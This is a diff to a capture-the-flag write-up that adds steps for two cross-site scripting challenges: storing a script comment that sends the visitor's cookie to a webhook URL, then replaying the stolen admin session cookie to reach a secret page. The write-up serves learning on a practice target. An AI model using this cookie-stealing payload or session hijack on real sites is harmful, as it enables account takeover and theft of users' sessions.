@@ -145,7 +145,32 @@ Hint 1: I'm quite lazy when develop this website
 <br><img width="788" alt="image" src="https://user-images.githubusercontent.com/79892065/158342507-47efa9af-6a62-4db7-9829-3b74734e9b73.png">
 <br>And ye we got the flag!
 
-## 16. SQL That You Can't See
+## 16. My First XSS 2
+The description says that its an upgraded version of the "My First XSS" challenge and can report to admin.<br>
+<br><img width="529" alt="image" src="https://user-images.githubusercontent.com/79892065/160345480-c18b3207-b5b6-4109-b487-83d365e534f0.png">
+<br>Reporting to admin, probably trying to steal admin cookies?
+<br>https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/
+<br>We can create a webhook in https:/webhook.site
+<br>We can also create a payload in the add comment ``<script>document.write('<img src="[WEBHOOKURL]?c='+document.cookie+'" />');</script>``<br>
+<br><img width="801" alt="image" src="https://user-images.githubusercontent.com/79892065/160345806-c545f1c2-3dca-4f28-aeca-dd418d3e6e62.png">
+<br>Pasting the webhook url in the payload, and submit the payload to the server
+<br>After we reload the website, we see the unloaded image<br>
+<br><img width="845" alt="image" src="https://user-images.githubusercontent.com/79892065/160345956-a2b48fce-1ea0-4c3a-917b-3442b0f7489f.png">
+<br>And checking the webhook site we see it worked! It's successfully stealed our user cookie
+<br>We can now press on the "Report Admin" button and the bot should visit the website to let our webhook site steal the cookie
+<br><img width="797" alt="image" src="https://user-images.githubusercontent.com/79892065/160346340-301a8522-88a5-4e65-b1b7-99d40e47c05c.png">
+<br>And we got the flag!
+
+## 16. XSS 2 Continue
+Hint: How to become admin by using the stolen admin cookie?
+<br>According to the hint, we need to use the admin cookie to view the secret only avaiable for admin
+<br>This is easy! Since I have the "Cookie Editor" extension, we can paste the admin session we stole earlier into the "session" cookie
+<br><img width="365" alt="image" src="https://user-images.githubusercontent.com/79892065/160347072-f71acdeb-1918-4c04-8f9b-d096f26b0007.png">
+<br>After saving the cookie, reload the page and we can see a section named "Secret"
+<br><img width="470" alt="image" src="https://user-images.githubusercontent.com/79892065/160347180-d4e3f50e-2f97-49e1-a7a7-7da91a0403c4.png">
+<br>Viewing the secret section we get the flag!
+
+## 17. SQL That You Can't See
 Hint: Whai is Blind SQL Injection?
 <br>Hmm, looks like we are heading back to the ``My First SQL`` challenge to check back what's going on
 <br><img width="577" alt="image" src="https://user-images.githubusercontent.com/79892065/158343061-934c084d-ba05-4a46-8c5d-8b6f5db229ec.png">
